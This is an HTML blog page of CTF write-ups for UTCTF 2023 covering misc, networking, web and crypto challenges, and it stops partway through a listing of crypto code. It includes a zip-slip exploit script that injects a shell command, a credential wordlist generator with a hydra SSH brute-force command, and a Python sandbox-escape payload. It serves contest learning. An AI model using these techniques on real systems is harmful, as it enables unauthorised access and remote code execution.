<!doctype html><html lang=en-us><head><title>UTCTF 2023 Megathread | flocto</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.115.1"><link rel=canonical href=/writeups/2023/utctf/utctf-megathread/><link href=/sass/main.min.1d10b866b77fb6aea6dcc76c561fd0eaf8ebd0bfef3227fbe839a686bc2b1875.css rel=stylesheet></head><body><div class=flexWrapper><header class=headerWrapper><div class=header><div><a href=/><span class=terminal>fl@cto ~ $</span></a></div><nav class=headerLinks><ul><li><a href=/about title>~/about</a></li><li><a href=/projects title>~/projects</a></li><li><a href=/writeups title>~/writeups</a></li><li><a href=/blog title>~/blog</a></li><li><a href=/ style=align-items:center;justify-content:center><img style=width:30px;height:30px;border-radius:15px;vertical-align:text-bottom src=/profile.png alt=Home></a></li></ul></nav></div></header><div class=content><main class=main><div class=postWrapper><h1>UTCTF 2023 Megathread</h1><ul class=tagList><li class=tagItem><a class=tagLink href=/tags/crypto/>crypto</a></li><li class=tagItem><a class=tagLink href=/tags/forensics/>forensics</a></li><li class=tagItem><a class=tagLink href=/tags/misc/>misc</a></li><li class=tagItem><a class=tagLink href=/tags/networking/>networking</a></li><li class=tagItem><a class=tagLink href=/tags/rev/>rev</a></li><li class=tagItem><a class=tagLink href=/tags/web/>web</a></li><li class=tagItem><a class=tagLink href=/tags/utctf/>utctf</a></li><li class=tagItem><a class=tagLink href=/tags/2023/>2023</a></li></ul><div><p>This past weekend I played in UTCTF 2023 by myself under <a href=https://utctf.live/teams/41>flocto solo run</a>.
Ended up in 11th place, not too shabby ðŸ˜Ž</p><p>While there were some infra issues, I still had a lot of fun solving these challenges, so I would consider this one a success.
Looking forward to next year, unless hxp takes precedence.</p><p>Anyway, here&rsquo;s a megathread containing mini writeups for the challenges I solved. As always, I don&rsquo;t do pwn, so none of them are here.</p><hr><h1 id=toc>TOC</h1><table><thead><tr><th>Table of Contents</th></tr></thead><tbody><tr><td><a href=#misc>Misc</a></td></tr><tr><td>- <a href=#dry-run>Dry Run</a></td></tr><tr><td>- <a href=#half-time-survey>Half-time Survey</a></td></tr><tr><td>- <a href=#zipper>Zipper</a></td></tr><tr><td><a href=#networking>Networking</a></td></tr><tr><td>- <a href=#a-network-problem---part-1>A Network Problem - Part 1</a></td></tr><tr><td>- <a href=#a-network-problem---part-2>A Network Problem - Part 2</a></td></tr><tr><td>- <a href=#a-network-problem---part-3>A Network Problem - Part 3</a></td></tr><tr><td><a href=#web>Web</a></td></tr><tr><td>- <a href=#calculator>Calculator</a></td></tr><tr><td><a href=#crypto>Crypto</a></td></tr><tr><td>- <a href=#affinity>Affinity</a></td></tr><tr><td>- <a href=#looks-wrong-tom-e>Looks Wrong tom E</a></td></tr><tr><td>- <a href=#provably-insecure>Provably Insecure</a></td></tr><tr><td><a href=#reversing>Reversing</a></td></tr><tr><td>- <a href=#reading-list>Reading List</a></td></tr><tr><td>- <a href=#game>Game</a></td></tr><tr><td>- <a href=#looks-correct-to-me>Looks Correct to Me</a></td></tr><tr><td><a href=#forensics>Forensics</a></td></tr><tr><td>- <a href=#easy-volatility>&ldquo;Easy&rdquo; Volatility</a></td></tr><tr><td>- <a href=#what-time-is-it>What Time is It?</a></td></tr><tr><td>- <a href=#redacted-text>Redacted Text</a></td></tr></tbody></table><hr><h2 id=misc>Misc</h2><p>Starting off with the simplest category.</p><h3 id=dry-run>Dry Run</h3><p><strong>Points: 20</strong></p><blockquote><p>Join our Discord server and look in the #announcements channel to find the flag. :-)</p></blockquote><p>Just a sanity check chall, nothing to see here.
<code>utflag{welc0me_to_utctf!}</code></p><p><a href=#toc>Back to TOC</a></p><h3 id=half-time-survey>Half-time Survey</h3><p><strong>Points: 20</strong></p><blockquote><p><a href=https://forms.gle/GnXCCpeCaaHPhU8o6>https://forms.gle/GnXCCpeCaaHPhU8o6</a></p></blockquote><p>Again, nothing to see here, just a survey.
<code>utflag{hack_hack_hack}</code></p><p><a href=#toc>Back to TOC</a></p><h3 id=zipper>Zipper</h3><p><strong>Points: 964</strong></p><blockquote><p>NOTE: echo &lsquo;Hello world&rsquo; is the only &ldquo;allowed&rdquo; command. Do not bruteforce other commands.</p><p>One of our spies has stolen documentation relating to a new class of missiles. Can you figure out how to hack them?</p><p>&ldquo;We have developed a new protocol to allow reprogramming missiles in flight. We send a base64 encoded string representing a specifically formatted zip file to control these missiles. The missiles themselves verify each command before executing them to ensure that a hacker cannot manipulate them.&rdquo;</p><p>A sample message has also been stolen by our spy.</p><p>By Aadhithya (@aadhi0319 on discord)</p><p><code>nc betta.utctf.live 12748</code></p><p><a href=files/zipper/commands.zip.b64>commands.zip.b64</a> <a href=files/zipper/verify_hash.py>verify_hash.py</a></p></blockquote><p>The first <em>real</em> challenge. The original challenge didn&rsquo;t release with the Python file, so let&rsquo;s start with the b64 file.
Opening it up, we get:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>UEsDBAoAAAAAADmPYVYAAAAAAAAAAAAAAAAJABwAY29tbWFuZHMvVVQJAAN95v9jfeb/Y3V4CwABBOgDAAAE6AMAAFBLAwQKAAAAAAAtj2FWWhLOtxMAAAATAAAAFAAcAGNvbW1hbmRzL2NvbW1hbmQudHh0VVQJAANm5v9jZub/Y3V4CwABBOgDAAAE6AMAAGVjaG8gJ0hlbGxvIFdvcmxkISdQSwMEFAAAAAgAMY9hVpwcB1ZUAAAAaQAAABIAHABjb21tYW5kcy9SRUFETUUubWRVVAkAA27m/2Nu5v9jdXgLAAEE6AMAAAToAwAANcrtDYAgDEXRVd4Axh0cpUKjxPIRWhS2l5j47yb3bArJ6QApXI6Rkl+t2+xkFJKCSqn5Zv9fXWAnQ4caRzxBBNzZNWMEwwSoLDQ+VFmbmGInd60vUEsBAh4DCgAAAAAAOY9hVgAAAAAAAAAAAAAAAAkAGAAAAAAAAAAQAO1BAAAAAGNvbW1hbmRzL1VUBQADfeb/Y3V4CwABBOgDAAAE6AMAAFBLAQIeAwoAAAAAAC2PYVZaEs63EwAAABMAAAAUABgAAAAAAAEAAACAgUMAAABjb21tYW5kcy9jb21tYW5kLnR4dFVUBQADZub/Y3V4CwABBOgDAAAE6AMAAFBLAQIeAxQAAAAIADGPYVacHAdWVAAAAGkAAAASABgAAAAAAAEAAACAgaQAAABjb21tYW5kcy9SRUFETUUubWRVVAUAA27m/2N1eAsAAQToAwAABOgDAABQSwUGAAAAAAMAAwABAQAARAEAAAAA
</span></span></code></pre></div><p>Very clearly this is base64, so let&rsquo;s decode it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;commands.zip.b64&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>)<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>open(<span style=color:#e6db74>&#34;commands.zip&#34;</span>, <span style=color:#e6db74>&#34;wb&#34;</span>)<span style=color:#f92672>.</span>write(base64<span style=color:#f92672>.</span>b64decode(data))
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>$ unzip commands.zip
</span></span><span style=display:flex><span>Archive:  commands.zip
</span></span><span style=display:flex><span>   creating: commands/
</span></span><span style=display:flex><span> extracting: commands/command.txt
</span></span><span style=display:flex><span>  inflating: commands/README.md
</span></span></code></pre></div><p>Opening up <code>command.txt</code>, we get:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>echo &#39;Hello World!&#39;
</span></span></code></pre></div><p>And <code>README.md</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>As long as command.txt contains approved commands, the system will execute it and relay the results back.
</span></span></code></pre></div><p>After I got to this point in the original challenge, I was stuck for a while. I didn&rsquo;t really see anywhere to progress or check for &ldquo;approved commands&rdquo;.
At some point, I moved on and came back when the <code>verify_hash.py</code> file was released.</p><p>Looking at the Python file, we see:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> zipfile
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_file</span>(name, archive):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> [file <span style=color:#66d9ef>for</span> file <span style=color:#f92672>in</span> archive<span style=color:#f92672>.</span>infolist() <span style=color:#66d9ef>if</span> file<span style=color:#f92672>.</span>filename <span style=color:#f92672>==</span> name][<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>archive <span style=color:#f92672>=</span> zipfile<span style=color:#f92672>.</span>ZipFile(sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>file <span style=color:#f92672>=</span> get_file(<span style=color:#e6db74>&#34;commands/command.txt&#34;</span>, archive)
</span></span><span style=display:flex><span>print(file)
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> archive<span style=color:#f92672>.</span>read(file)
</span></span><span style=display:flex><span>print(data, len(data))
</span></span><span style=display:flex><span>md5 <span style=color:#f92672>=</span> hashlib<span style=color:#f92672>.</span>md5(data)<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>print(md5)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> md5 <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;0e491b13e7ca6060189fd65938b0b5bc&#34;</span>:
</span></span><span style=display:flex><span>    archive<span style=color:#f92672>.</span>extractall()
</span></span><span style=display:flex><span>    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;bash commands/command.txt&#34;</span>)
</span></span><span style=display:flex><span>    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;rm -r commands&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Invalid Command&#34;</span>)
</span></span></code></pre></div><p>Very clearly there&rsquo;s a vulnerability if more than one file has the name <code>commands/command.txt</code> in the zip file. The <code>get_file</code> function will only return the first file, meaning when
<code>extractall</code> is run, it can possibly overwrite the <code>command.txt</code> file with a malicious one.</p><p>So the solve is just a simple zip slip attack. We can create a zip file with a malicious <code>command.txt</code> file, and then zip it with the original <code>command.txt</code> file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b64decode, b64encode
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>folder <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;commands&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;commands/command.txt&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>    f<span style=color:#f92672>.</span>write(<span style=color:#e6db74>&#34;echo &#39;Hello World!&#39;&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># zipslip</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> zipfile <span style=color:#f92672>import</span> ZipFile
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> ZipFile(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>folder<span style=color:#e6db74>}</span><span style=color:#e6db74>.zip&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>) <span style=color:#66d9ef>as</span> zipObj:
</span></span><span style=display:flex><span>    <span style=color:#75715e># add normal file</span>
</span></span><span style=display:flex><span>    zipObj<span style=color:#f92672>.</span>write(<span style=color:#e6db74>&#34;commands/command.txt&#34;</span>, <span style=color:#e6db74>&#34;commands/command.txt&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#75715e># add zipslip file</span>
</span></span><span style=display:flex><span>    zipObj<span style=color:#f92672>.</span>write(<span style=color:#e6db74>&#34;inj.txt&#34;</span>, <span style=color:#e6db74>&#34;commands/../commands/command.txt&#34;</span>) <span style=color:#75715e># the ../ isn&#39;t even necessary, just repeating commands/command.txt is enough</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># read .zip file</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>folder<span style=color:#e6db74>}</span><span style=color:#e6db74>.zip&#34;</span>, <span style=color:#e6db74>&#34;rb&#34;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># encode .zip file</span>
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> b64encode(data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># nc betta.utctf.live 12748</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> remote
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;betta.utctf.live&#34;</span>, <span style=color:#ae81ff>12748</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(data)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p>This gives us our flag: <code>utflag{https://youtu.be/bZe5J8SVCYQ}</code></p><p><a href=#toc>Back to TOC</a></p><h2 id=networking>Networking</h2><p>An interesting category you don&rsquo;t see in many CTFs.</p><h3 id=a-network-problem---part-1>A Network Problem - Part 1</h3><p><strong>Points: 100</strong></p><blockquote><p>There are some interesting ports open on betta.utctf.live, particularly port 8080. By Robert Hill (@Rob H on discord)</p><p><code>betta.utctf.live:8080</code></p></blockquote><p>This challenge is just connecting via netcat.</p><pre tabindex=0><code class=language-terminal data-lang=terminal>$ nc betta.utctf.live 8080
Hi Wade! I am using socat to broadcat this message. Pretty nifty right? --jwalker utflag{meh-netcats-cooler}
</code></pre><p><a href=#toc>Back to TOC</a></p><h3 id=a-network-problem---part-2>A Network Problem - Part 2</h3><p><strong>Points: 614</strong></p><blockquote><p>Update: smb port has been moved to 8445 from 445 on networking-misc-p2</p><p>betta.utctf.live has other interesting ports. Lets look at 8445 this time. By Robert Hill (@Rob H on discord)</p><p><code>betta.utctf.live:8445</code></p></blockquote><p>This time its a Samba share. Trying to connect shows that we don&rsquo;t even need a specific username or password.</p><pre tabindex=0><code class=language-terminal data-lang=terminal>$ smbclient -L \\betta.utctf.live -p 8445 -U %

        Sharename       Type      Comment
        ---------       ----      -------
        WorkShares      Disk      Sharing of work files
        BackUps         Disk      File Backups.
        IPC$            IPC       IPC Service (Samba Server)
$ smbclient \\\\betta.utctf.live\\WorkShares -p 8445 -U %
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Wed Mar  8 13:45:05 2023
  ..                                  D        0  Wed Mar  8 13:45:05 2023
  shares                              D        0  Wed Mar  8 13:45:05 2023

                9974088 blocks of size 1024. 6100244 blocks available
smb: \&gt; 
</code></pre><p>Anyway, after looking around for a while, we come across <code>\WorkShares\shares\IT\Itstuff\notetoIT</code>:</p><pre tabindex=0><code class=language-terminal data-lang=terminal>smb: \shares\IT\Itstuff\&gt; get notetoIT note.txt
...
$ cat note.txt
I don&#39;t understand the fasination with the magic phrase &#34;abracadabra&#34;, but too many people are using them as passwords. Crystal Ball, Wade Coldwater, Jay Walker, and Holly Wood all basically have the same password. Can you please reach out to them and get them to change thier passwords or at least get them append a special character?

-- Arty F.

utflag{out-of-c0ntrol-access}
</code></pre><p><a href=#toc>Back to TOC</a></p><h3 id=a-network-problem---part-3>A Network Problem - Part 3</h3><p><strong>Points: 935</strong></p><blockquote><p>We&rsquo;ve gathered a lot of information at this point, let get access through ssh. (ignore port 22, use 8822)</p><p>(Use of brute force is permitted for this problem, but please set the wait time in hydra so you don&rsquo;t overwhelm the server)</p><p>By Rob H (@Rob H on discord)</p><p><code>betta.utctf.live:8822</code></p></blockquote><p>From the not-so-subtle hint that this is <code>ssh</code> bruteforce, let&rsquo;s go generate some possible usernames and passwords.
The note in the last challenges tells us that we have 4 people to bruteforce: Crystal Ball, Wade Coldwater, Jay Walker, and Holly Wood.
Their password is also likely to be <code>abracadabra</code> with some special character appended.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>names <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;Crystal Ball&#34;</span>,<span style=color:#e6db74>&#34;Wade Coldwater&#34;</span>, <span style=color:#e6db74>&#34;Jay Walker&#34;</span>, <span style=color:#e6db74>&#34;Holly Wood&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># formats</span>
</span></span><span style=display:flex><span><span style=color:#75715e># FirstName.LastName</span>
</span></span><span style=display:flex><span><span style=color:#75715e># LastName.FirstName</span>
</span></span><span style=display:flex><span><span style=color:#75715e># FirstNameL</span>
</span></span><span style=display:flex><span><span style=color:#75715e># FLastName</span>
</span></span><span style=display:flex><span><span style=color:#75715e># LFirstName</span>
</span></span><span style=display:flex><span><span style=color:#75715e># FirstName.L</span>
</span></span><span style=display:flex><span><span style=color:#75715e># F.LastName</span>
</span></span><span style=display:flex><span><span style=color:#75715e># in both upper and lower case</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>usernames <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> name <span style=color:#f92672>in</span> names:
</span></span><span style=display:flex><span>    first, last <span style=color:#f92672>=</span> name<span style=color:#f92672>.</span>split()
</span></span><span style=display:flex><span>    finit <span style=color:#f92672>=</span> first[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>    linit <span style=color:#f92672>=</span> last[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>    usernames<span style=color:#f92672>.</span>append(first <span style=color:#f92672>+</span> last)
</span></span><span style=display:flex><span>    usernames<span style=color:#f92672>.</span>append(last <span style=color:#f92672>+</span> first)
</span></span><span style=display:flex><span>    usernames<span style=color:#f92672>.</span>append(first <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;.&#39;</span> <span style=color:#f92672>+</span> last)
</span></span><span style=display:flex><span>    usernames<span style=color:#f92672>.</span>append(last <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;.&#39;</span> <span style=color:#f92672>+</span> first)
</span></span><span style=display:flex><span>    usernames<span style=color:#f92672>.</span>append(first <span style=color:#f92672>+</span> linit)
</span></span><span style=display:flex><span>    usernames<span style=color:#f92672>.</span>append(finit <span style=color:#f92672>+</span> last)
</span></span><span style=display:flex><span>    usernames<span style=color:#f92672>.</span>append(first <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;.&#39;</span> <span style=color:#f92672>+</span> linit)
</span></span><span style=display:flex><span>    usernames<span style=color:#f92672>.</span>append(finit <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;.&#39;</span> <span style=color:#f92672>+</span> last)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>lower <span style=color:#f92672>=</span> [name<span style=color:#f92672>.</span>lower() <span style=color:#66d9ef>for</span> name <span style=color:#f92672>in</span> usernames]
</span></span><span style=display:flex><span>upper <span style=color:#f92672>=</span> [name<span style=color:#f92672>.</span>upper() <span style=color:#66d9ef>for</span> name <span style=color:#f92672>in</span> usernames]
</span></span><span style=display:flex><span>usernames<span style=color:#f92672>.</span>extend(lower)
</span></span><span style=display:flex><span>usernames<span style=color:#f92672>.</span>extend(upper)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span>special <span style=color:#f92672>=</span> string<span style=color:#f92672>.</span>punctuation
</span></span><span style=display:flex><span>base <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;abracadabra&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>passwords <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> s <span style=color:#f92672>in</span> special:
</span></span><span style=display:flex><span>    passwords<span style=color:#f92672>.</span>append(base <span style=color:#f92672>+</span> s)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;usernames.txt&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> name <span style=color:#f92672>in</span> usernames:
</span></span><span style=display:flex><span>        f<span style=color:#f92672>.</span>write(name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;passwords.txt&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> password <span style=color:#f92672>in</span> passwords:
</span></span><span style=display:flex><span>        f<span style=color:#f92672>.</span>write(password <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><p>Now we can use <code>hydra</code> to bruteforce the ssh server (and remembering to set a wait time to be nice to the server).</p><pre tabindex=0><code class=language-terminal data-lang=terminal>$ hydra -L usernames.txt -P passwords.txt -t 4 betta.utctf.live:8822 ssh -W 0.1
</code></pre><p>After a while, we get a hit:</p><pre tabindex=0><code class=language-terminal data-lang=terminal>[8822][ssh] host: betta.utctf.live   login: wcoldwater   password: abracadabra$
</code></pre><p>Now we can just connect via ssh and get our flag:</p><pre tabindex=0><code class=language-terminal data-lang=terminal>$ ssh wcoldwater@betta.utctf.live -p 8822
wcoldwater@betta.utctf.live&#39;s password: abracadabra$
utctf{cust0m3d-lsts-rule!} well done!
</code></pre><p><a href=#toc>Back to TOC</a></p><h2 id=web>Web</h2><p>Only did a single web challenge, which was also actually just a Pyjail.</p><h3 id=calculator>Calculator</h3><p><strong>Points: 856</strong></p><blockquote><p>Who says guessing games shouldn&rsquo;t let you do math?</p><p><a href=http://guppy.utctf.live:5957>http://guppy.utctf.live:5957</a></p><p>By Alex (@Alex_ on discord)</p></blockquote><p>This challenge is actually just 4 mini pyjails. Each pyjail has the same format, which generally looked like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>from</span> random <span style=color:#f92672>import</span> randbits
</span></span><span style=display:flex><span>solution <span style=color:#f92672>=</span> randbits(<span style=color:#ae81ff>32</span>)
</span></span><span style=display:flex><span>password <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;password.txt&#34;</span>)<span style=color:#f92672>.</span>read()<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>inp <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;Input from the website: &#34;</span>)
</span></span><span style=display:flex><span>guess <span style=color:#f92672>=</span> eval(inp) <span style=color:#75715e># later versions had eval(inp, {&#34;__builtins__&#34;: {}}) and eval(inp, {})</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> guess <span style=color:#f92672>==</span> solution:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Correct!&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;The password is: &#34;</span> <span style=color:#f92672>+</span> password)
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Incorrect!&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Your guess was: &#34;</span>, guess, <span style=color:#e6db74>&#34; and the solution was: &#34;</span>, solution)
</span></span></code></pre></div><p>The author unfortunately forgot that <code>solution</code> and <code>password</code> were both in the global scope so as long as we can access the <code>main</code> module, we can get them easily</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>__import__(<span style=color:#e6db74>&#34;__main__&#34;</span>)<span style=color:#f92672>.</span>solution <span style=color:#75715e># for 0-2</span>
</span></span></code></pre></div><p>Passwords were:</p><pre tabindex=0><code>Level 0: PuXqj7n4WNZzStnWbtPv
Level 1: Krdi9yQuY8mHoteZDCF5
Level 2: E46Dnqb5enAMgGArbruu
Level 3: 5F4p7aLgQ5Nfn5YM8s68
</code></pre><p>The last challenge, challenge 3, removed <code>__builtins__</code>, so we couldn&rsquo;t use import. Fortunately the old <code>().__class__.__bases__[0].__subclasses__()</code> trick still works.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>()<span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__base__<span style=color:#f92672>.</span>__subclasses__()[<span style=color:#ae81ff>84</span>]()<span style=color:#f92672>.</span>load_module(<span style=color:#e6db74>&#39;__main__&#39;</span>)<span style=color:#f92672>.</span>solution <span style=color:#75715e># for 3</span>
</span></span></code></pre></div><p><code>utflag{LGvb7PJXG5JDwhsEW7xp}</code></p><p><a href=#toc>Back to TOC</a></p><h2 id=crypto>Crypto</h2><p>Many blunders and mistakes&mldr;</p><h3 id=affinity>Affinity</h3><p><strong>Points: 991</strong></p><blockquote><p>I just found out that the source code for AES is public. How can I trust that my secrets won&rsquo;t be decrypted if the decryption algorithm is public. Since I&rsquo;m a genius, I decided to make some modifications and roll my own crypto. Now you&rsquo;ll never decrypt my secret!</p><p><code>3384f87f781c394b79e331510540a4125a371b057b058d8e793521cd43f2ae94</code></p><p>^^all of that is one line even though it is split into two. I don&rsquo;t control the line breaks sorry :(. By Aadhithya (@aadhi0319 on Discord)</p><p><code>nc puffer.utctf.live 52584</code></p><p><a href=files/affinity/aes.py>aes.py</a> <a href=files/affinity/encrypt_pub.py>encrypt_pub.py</a></p></blockquote><p><code>aes.py</code> contains a simple AES implementation, with only one major difference.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>    <span style=color:#75715e># Rijndael S-box</span>
</span></span><span style=display:flex><span>    sbox <span style=color:#f92672>=</span> [<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>8</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>13</span>, <span style=color:#ae81ff>14</span>, <span style=color:#ae81ff>15</span>, <span style=color:#ae81ff>16</span>, <span style=color:#ae81ff>17</span>, <span style=color:#ae81ff>18</span>, <span style=color:#ae81ff>19</span>, <span style=color:#ae81ff>20</span>, <span style=color:#ae81ff>21</span>, <span style=color:#ae81ff>22</span>, <span style=color:#ae81ff>23</span>, <span style=color:#ae81ff>24</span>, <span style=color:#ae81ff>25</span>, <span style=color:#ae81ff>26</span>, <span style=color:#ae81ff>27</span>, <span style=color:#ae81ff>28</span>, <span style=color:#ae81ff>29</span>, <span style=color:#ae81ff>30</span>, <span style=color:#ae81ff>31</span>, <span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>33</span>, <span style=color:#ae81ff>34</span>, <span style=color:#ae81ff>35</span>, <span style=color:#ae81ff>36</span>, <span style=color:#ae81ff>37</span>, <span style=color:#ae81ff>38</span>, <span style=color:#ae81ff>39</span>, <span style=color:#ae81ff>40</span>, <span style=color:#ae81ff>41</span>, <span style=color:#ae81ff>42</span>, <span style=color:#ae81ff>43</span>, <span style=color:#ae81ff>44</span>, <span style=color:#ae81ff>45</span>, <span 